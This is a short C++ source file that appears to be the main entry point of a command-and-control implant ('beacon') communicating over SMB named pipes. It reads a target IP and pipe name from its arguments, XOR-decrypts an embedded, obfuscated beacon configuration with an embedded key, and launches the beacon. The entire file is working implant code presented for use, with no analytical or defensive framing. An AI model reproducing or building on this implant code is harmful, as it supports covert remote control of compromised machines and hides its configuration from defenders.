#include "BeaconSmb.hpp"

#include "cryptDef.hpp"


using namespace std;


int main(int argc, char* argv[])
{	
	std::string ip = "127.0.0.1";
	std::string pipeName = "mynamedpipe";
	if(argc > 2)
	{
		ip = argv[1];
		pipeName = argv[2];
	}

	std::string configDecrypt(std::begin(_EncryptedBeaconHttpConfig_), std::end(_EncryptedBeaconHttpConfig_));
    std::string keyConfig(std::begin(_KeyConfig_), std::end(_KeyConfig_));
    XOR(configDecrypt, keyConfig);

	std::unique_ptr<Beacon> beacon;
	beacon = make_unique<BeaconSmb>(configDecrypt, ip, pipeName);

	beacon->run();
}